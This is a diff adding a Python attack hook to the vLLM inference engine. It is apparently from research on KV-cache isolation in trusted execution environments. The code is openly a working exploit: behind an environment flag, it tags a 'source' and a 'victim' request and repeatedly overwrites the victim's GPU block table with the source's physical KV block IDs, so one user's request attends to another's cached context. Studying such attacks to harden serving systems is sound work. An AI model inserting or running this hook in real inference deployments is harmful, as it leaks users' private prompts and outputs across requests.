@@ -1,0 +1,263 @@
+# SPDX-License-Identifier: Apache-2.0
+#
+# TZKV minimal block-table metadata tamper hook for vLLM v0.14.
+#
+# This attack does NOT copy KV payload tensors.
+# It corrupts the GPU-side block_table_tensor after clean slot_mapping is
+# computed, so victim attention resolves logical blocks to source physical
+# KV blocks.
+
+from __future__ import annotations
+
+import json
+import os
+import time
+from typing import Any
+
+import numpy as np
+import torch
+from vllm.v1.worker.tzkv_log_utils import tzkv_log_enabled
+
+
+def _flag(name: str, default: str = "0") -> bool:
+    return os.getenv(name, default).lower() in ("1", "true", "yes", "on")
+
+
+class TZKVBlockTableAttackHook:
+    def __init__(self) -> None:
+        self.enabled = _flag("TZKV_BLOCK_TABLE_ATTACK_ENABLE", "0")
+        self.log_path = os.getenv(
+            "TZKV_LOG",
+            "/home/xx/tee-llm-thor/logs/block_table_attack_vllm014.log.jsonl",
+        )
+        self.max_blocks = int(os.getenv("TZKV_BLOCK_TABLE_ATTACK_MAX_BLOCKS", "16"))
+        self.min_prefill = int(os.getenv("TZKV_BLOCK_TABLE_ATTACK_MIN_PREFILL", "8"))
+
+        # Important: default is continuous metadata tamper.
+        # commit_block_table() refreshes GPU block_table every step, so we must
+        # rewrite the victim GPU row again on later decode steps.
+        self.once = _flag("TZKV_BLOCK_TABLE_ATTACK_ONCE", "0")
+
+        self.role_by_key: dict[str, str] = {}
+        self.source_key: str | None = None
+        self.victim_key: str | None = None
+        self.source_snapshot: list[np.ndarray] | None = None
+        self.source_snapshot_blocks: list[int] = []
+        self.tamper_count = 0
+
+        self._log("block_table_hook_init", {
+            "enabled": self.enabled,
+            "max_blocks": self.max_blocks,
+            "min_prefill": self.min_prefill,
+            "once": self.once,
+        })
+
+    def _log(self, event: str, data: dict[str, Any] | None = None) -> None:
+        if not tzkv_log_enabled():
+            return
+        if not self.enabled:
+            return
+        rec: dict[str, Any] = {
+            "ts": time.time(),
+            "pid": os.getpid(),
+            "event": event,
+        }
+        if data:
+            rec.update(data)
+        try:
+            os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
+            with open(self.log_path, "a", encoding="utf-8") as f:
+                f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+        except Exception:
+            pass
+
+    def _get_req_key(self, runner: Any, req_idx: int) -> str:
+        ib = getattr(runner, "input_batch", None)
+
+        for name in ("req_ids", "request_ids"):
+            xs = getattr(ib, name, None)
+            if isinstance(xs, (list, tuple)) and 0 <= req_idx < len(xs):
+                v = xs[req_idx]
+                if v is not None:
+                    return str(v)
+
+        m = getattr(ib, "req_id_to_index", None)
+        if isinstance(m, dict):
+            for rid, idx in m.items():
+                try:
+                    if int(idx) == int(req_idx):
+                        return str(rid)
+                except Exception:
+                    pass
+
+        reqs = getattr(ib, "requests", None)
+        if isinstance(reqs, (list, tuple)) and 0 <= req_idx < len(reqs):
+            r = reqs[req_idx]
+            for name in ("request_id", "req_id", "id"):
+                v = getattr(r, name, None)
+                if v is not None:
+                    return str(v)
+
+        return f"row:{req_idx}"
+
+    def _tables(self, runner: Any) -> list[Any]:
+        bt = getattr(getattr(runner, "input_batch", None), "block_table", None)
+        return list(getattr(bt, "block_tables", []) or [])
+
+    def _snapshot_source(self, runner: Any, req_idx: int, key: str) -> None:
+        snaps: list[np.ndarray] = []
+        num_blocks: list[int] = []
+
+        for bt in self._tables(runner):
+            n = int(bt.num_blocks_per_row[req_idx])
+            n = min(n, self.max_blocks)
+            row = bt.block_table.np[req_idx, :n].copy()
+            snaps.append(row)
+            num_blocks.append(int(n))
+
+        if not snaps or max(num_blocks or [0]) <= 0:
+            self._log("source_block_table_snapshot_empty", {
+                "req_idx": int(req_idx),
+                "req_key": key,
+                "num_blocks": num_blocks,
+            })
+            return
+
+        self.source_snapshot = snaps
+        self.source_snapshot_blocks = num_blocks
+        self._log("source_block_table_snapshot_ok", {
+            "req_idx": int(req_idx),
+            "req_key": key,
+            "num_groups": len(snaps),
+            "num_blocks": num_blocks,
+            "blocks_group0": snaps[0].astype(int).tolist()[:32],
+        })
+
+    @torch.inference_mode()
+    def _tamper_victim_gpu_row(self, runner: Any, req_idx: int, key: str) -> None:
+        if self.source_snapshot is None:
+            self._log("skip_no_source_snapshot", {
+                "victim_req_idx": int(req_idx),
+                "victim_req_key": key,
+            })
+            return
+
+        if self.once and self.tamper_count > 0:
+            self._log("skip_once_already_tampered", {
+                "victim_req_idx": int(req_idx),
+                "victim_req_key": key,
+                "tamper_count": self.tamper_count,
+            })
+            return
+
+        copied_groups = 0
+        copied_blocks: list[int] = []
+        victim_before0: list[int] = []
+        victim_after0: list[int] = []
+
+        for gid, bt in enumerate(self._tables(runner)):
+            if gid >= len(self.source_snapshot):
+                continue
+
+            src = self.source_snapshot[gid]
+            if src.size == 0:
+                continue
+
+            gpu_row = bt.block_table.gpu[req_idx]
+            n = min(int(src.shape[0]), int(gpu_row.shape[0]), self.max_blocks)
+            if n <= 0:
+                continue
+
+            before = gpu_row[:n].detach().cpu().numpy().astype(int).tolist()
+            src_t = torch.as_tensor(src[:n], device=gpu_row.device, dtype=gpu_row.dtype)
+            gpu_row[:n].copy_(src_t)
+            after = gpu_row[:n].detach().cpu().numpy().astype(int).tolist()
+
+            copied_groups += 1
+            copied_blocks.append(n)
+            if gid == 0:
+                victim_before0 = before
+                victim_after0 = after
+
+        self.tamper_count += 1
+
+        self._log("victim_block_table_tamper_done", {
+            "victim_req_idx": int(req_idx),
+            "victim_req_key": key,
+            "source_req_key": self.source_key,
+            "copied_groups": copied_groups,
+            "copied_blocks": copied_blocks,
+            "victim_before_group0": victim_before0[:32],
+            "victim_after_group0": victim_after0[:32],
+            "source_blocks_group0": (
+                self.source_snapshot[0].astype(int).tolist()[:32]
+                if self.source_snapshot else []
+            ),
+            "tamper_count": self.tamper_count,
+        })
+
+    def after_slot_mapping_commit(
+        self,
+        runner: Any,
+        scheduler_output: Any,
+        req_indices: Any,
+        positions: Any,
+        total_num_scheduled_tokens: int,
+    ) -> None:
+        if not self.enabled:
+            return
+
+        try:
+            req_indices_np = np.asarray(req_indices)
+            if req_indices_np.size == 0:
+                return
+
+            ordered_req_indices: list[int] = []
+            for x in req_indices_np.tolist():
+                i = int(x)
+                if i >= 0 and i not in ordered_req_indices:
+                    ordered_req_indices.append(i)
+
+            for req_idx in ordered_req_indices:
+                n_sched = int((req_indices_np == req_idx).sum())
+                key = self._get_req_key(runner, req_idx)
+
+                # Do not assign new roles on tiny decode-only steps.
+                if key not in self.role_by_key and n_sched < self.min_prefill:
+                    continue
+
+                if key not in self.role_by_key:
+                    if self.source_key is None:
+                        self.source_key = key
+                        self.role_by_key[key] = "source"
+                        self._log("request_role_assigned", {
+                            "req_idx": int(req_idx),
+                            "req_key": key,
+                            "role": "source",
+                            "n_sched": n_sched,
+                        })
+                    elif self.victim_key is None and key != self.source_key:
+                        self.victim_key = key
+                        self.role_by_key[key] = "victim"
+                        self._log("request_role_assigned", {
+                            "req_idx": int(req_idx),
+                            "req_key": key,
+                            "role": "victim",
+                            "n_sched": n_sched,
+                        })
+
+                role = self.role_by_key.get(key)
+
+                if role == "source":
+                    # Keep refreshing source block ids as source grows.
+                    self._snapshot_source(runner, req_idx, key)
+
+                elif role == "victim":
+                    # Corrupt GPU block table metadata only.
+                    # CPU block table and slot_mapping remain clean.
+                    self._tamper_victim_gpu_row(runner, req_idx, key)
+
+        except Exception as e:
+            self._log("block_table_hook_error", {
+                "error": repr(e),
+            })
